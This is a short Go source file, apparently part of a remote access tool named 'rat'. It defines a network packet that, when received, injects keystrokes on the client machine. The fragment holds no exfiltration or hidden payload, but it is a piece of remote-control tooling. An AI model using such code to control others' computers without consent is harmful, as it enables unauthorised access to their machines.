package main

import (
	"rat/client/screen"
	"rat/shared/network/header"

	"gopkg.in/mgo.v2/bson"
)

type KeyPacket struct {
	Key  int "keyCode"
	Type int "state"
}

func (packet KeyPacket) Header() header.PacketHeader {
	return header.KeyHeader
}

func (packet KeyPacket) OnReceive() error {
	screen.Key(uint16(packet.Key), packet.Type)

	return nil
}

func (packet KeyPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
